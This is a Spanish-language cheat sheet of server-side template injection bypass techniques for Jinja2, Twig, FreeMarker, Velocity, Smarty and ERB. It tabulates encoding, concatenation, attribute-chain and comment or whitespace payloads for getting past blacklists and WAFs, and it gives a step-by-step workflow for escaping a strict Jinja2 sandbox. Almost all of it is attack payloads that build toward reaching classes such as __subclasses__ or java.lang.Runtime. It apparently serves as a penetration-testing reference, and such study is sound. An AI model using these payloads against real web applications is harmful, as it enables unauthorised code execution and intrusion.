---
aliases:
  - SSTI Bypass
  - SSTI Filter Evasion
  - SSTI WAF Bypass
tags:
  - type/cheatsheet
  - vuln/ssti
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Server-Side Template Injection (SSTI)]]'
---
# SSTI - Bypasses y Filter Evasion

***

## Encoding (Unicode / Hex / Base64)

| **Variante** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Hex escapes en strings (Python) | `'\x5f\x5fclass\x5f\x5f'` (= `__class__`) | Bypass de blacklist de `__`. |
| Octal escapes | `'\137\137class\137\137'` | Misma idea, base 8. |
| Unicode escapes | `'__class__'` | Python/JS. |
| HTML entities | `&#x7B;&#x7B;7*7&#x7D;&#x7D;` (`{{7*7}}`) | Si app decodea HTML antes del template. |
| URL encoding | `%7B%7B7*7%7D%7D` | Bypass WAF basado en regex. |
| Doble URL encoding | `%257B%257B7*7%257D%257D` | Si app decodea 2 veces. |
| Unicode lookalikes | `{{` (U+007B) → `｛｛` (U+FF5B fullwidth) | Algunos parsers normalizan. |
| Base64 dentro de payload | `{{ 'aWQ='\|b64decode\|...}}` | Encadenar decode con eval. |
| Escape via concat (Jinja2) | `{{ ('__cl' + 'ass__') }}` | Construir nombre por partes. |
| Escape via format (Jinja2) | `{{ "%c%c..."|format(95,95,99,...) }}` | ASCII codes. |
| Escape via join (Jinja2) | `{{ ['__cl','ass__']\|join }}` | Array join. |
| Escape via attr filter | `{{ ()\|attr('\x5f\x5fclass\x5f\x5f') }}` | Hex en attr arg. |
^ssti-bypass-encoding

___

## String Concatenation

| **Variante** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Python `+` | `{{ '__cl' + 'ass__' }}` | Concat string en runtime. |
| Python `format` | `{{ "{}{}{}".format('__','cl','ass') }}` | format con placeholders. |
| Python `f-string` (3.6+) | `{{ f'__{x}__' }}` | Si f-strings parsean. |
| Java string + | `${"java.lang."+"Runtime"}` | Velocity / FreeMarker. |
| Java String.format | `${String.format("%s%s","java.","lang.Runtime")}` | Build full classname. |
| Java concat method | `${"java.".concat("lang.Runtime")}` | Method chain. |
| Twig concat `~` | `{{ 'sys' ~ 'tem' }}` | Twig string concat operator. |
| Smarty `{ldelim}` | `{ldelim}{ldelim}7*7{rdelim}{rdelim}` | Escape de delimitadores. |
| FreeMarker `?join` | `${["sys","tem"]?join("")}` | Join sin separador. |
| ERB string interpolation | `<%= "sys" + "tem" %>` | Direct. |
| Build classname dinámico | Concatenar partes para evitar match con blacklist | Universal pattern. |
^ssti-bypass-concat

___

## Attribute Lookup Chains

| **Variante** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Python dot notation | `obj.__class__.__bases__` | Default — bloqueado por sandboxes. |
| Python bracket notation | `obj['__class__']['__bases__']` | Bypass `.` filter. |
| Python `getattr` | `getattr(obj, '__class__')` | Function form — algunos sandboxes solo filtran sintaxis. |
| Jinja2 `attr` filter | `obj\|attr('__class__')` | Filter chain bypass. |
| Subscript con index | `obj[0]['__class__']` | Si obj es list. |
| `vars()` lookup | `vars(obj)['attr']` | Built-in dict. |
| `dir()` discovery | `{{dir(obj)}}` | List atributos disponibles — pre-explotación. |
| Reflection via `globals()` | `{{globals()['os']}}` | Si globals accessible. |
| Walk MRO | `obj.__class__.__mro__[1].__subclasses__()[N]` | Subclass index N varía por interpreter. |
| Walk via `__base__` | `obj.__class__.__base__.__subclasses__()` | Alternativa a `__bases__[0]`. |
| Walk via `type` | `type(obj).__bases__` | type() return class. |
| Walk via `__init_subclass__` | `obj.__init_subclass__.__self__` | Magic method bypass. |
^ssti-bypass-attr-chain

### Workflow para Jinja2 con sandbox estricto

```python
# 1. Confirmar que basics están bloqueados
{{ self.__init__.__globals__ }}  # → Forbidden

# 2. Probar con bracket notation
{{ ()['__class__'] }}  # A veces pasa

# 3. Si no, usar attr filter
{{ ()|attr('__class__')|attr('__bases__') }}

# 4. Si attr filtrado por substring, encoding hex
{{ ()|attr('\x5f\x5fclass\x5f\x5f') }}

# 5. Si filtra `attr` literal, usar format
{{ ()|attr("%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)) }}
```

___

## Comment / Whitespace Tricks

| **Variante** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Comentarios Twig | `{{ '_'~{# comment #}'_class__' }}` | Romper string match con comment. |
| Comentarios Jinja2 | `{{ '__cl' ~ {# x #} ~ 'ass__' }}` | Ver arriba. |
| Comentarios FreeMarker | `${"java.<#-- comment -->lang.Runtime"}` | Inline comment. |
| Comentarios Velocity | `#* comment *# ${cmd}` | Comment estilo Velocity. |
| Whitespace en expresiones | `{{   7   *   7   }}` | Spaces múltiples. |
| Newlines en expresiones | `{{\n7*7\n}}` | Newline en string puede pasar regex. |
| Tabs en expresiones | `{{\t7*7\t}}` | Tab. |
| Trailing whitespace | `{{ 7*7 }}` (con espacio antes de `}}`) | Default Twig/Jinja2 lo permite. |
| Leading whitespace | `{{- 7*7 -}}` | Whitespace control syntax. |
| Mixed delimiters | `{{ %} 7*7 {% }}` | Comentarios + delimitadores. |
| Engine-specific escape | `{% raw %}{{7*7}}{% endraw %}` | Actually NO ejecuta — pero algunos filtros lo procesan igual. |
| Comment-injection FreeMarker | `${"java"+<#--x-->".lang.Runtime"}` | Compositional. |
^ssti-bypass-comment-whitespace

### Patrón de bypass general

```
1. Identificar qué bloquea el filtro:
   - Substring match de "__class__" / "system" / "exec" / etc.
   - Regex de patrones específicos.
   - Caracteres prohibidos (puntos, brackets, quotes).

2. Aplicar contramedida:
   - Substring → concat / format / encoding.
   - Regex → comments / whitespace.
   - Charset → alternative notation (bracket / attr filter).

3. Combinar capas: encoding hex + concat + attr filter en cascada.
```

***
